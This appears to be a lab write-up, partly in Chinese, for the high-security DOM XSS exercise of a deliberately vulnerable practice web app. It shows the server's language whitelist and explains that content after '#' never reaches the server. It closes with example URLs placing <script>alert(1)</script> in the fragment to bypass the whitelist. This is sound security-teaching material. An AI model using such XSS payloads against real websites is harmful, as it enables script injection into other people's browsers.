# XSS (DOM) - High

## View Source

```PHP
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

## Code Review

- 白名單驗證是否為 *English* 等，否則重導向

## Answer

- [*RFC 3986: section 3.4*](https://www.rfc-editor.org/rfc/rfc3986#section-3.4)
    > *The query component is indicated by the first question mark ("?") character and terminated by a number sign ("#") character or by the end of the URI.*
- 意即 `#` 後面的不是 *query*，不會傳送到給網站服務
    - 可用 *F12 DevTools* 或是 *Burp Suite* 觀察
- 同理，*Medium Level* 也可用此方法
    - E.g., `http://127.0.0.1/vulnerabilities/xss_d/?#default=<script>alert(1)</script>`

### Example

```
http://127.0.0.1/vulnerabilities/xss_d/#default=<script>alert(1)</script>
http://127.0.0.1/vulnerabilities/xss_d/?default=#<script>alert(1)</script>
http://127.0.0.1/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
```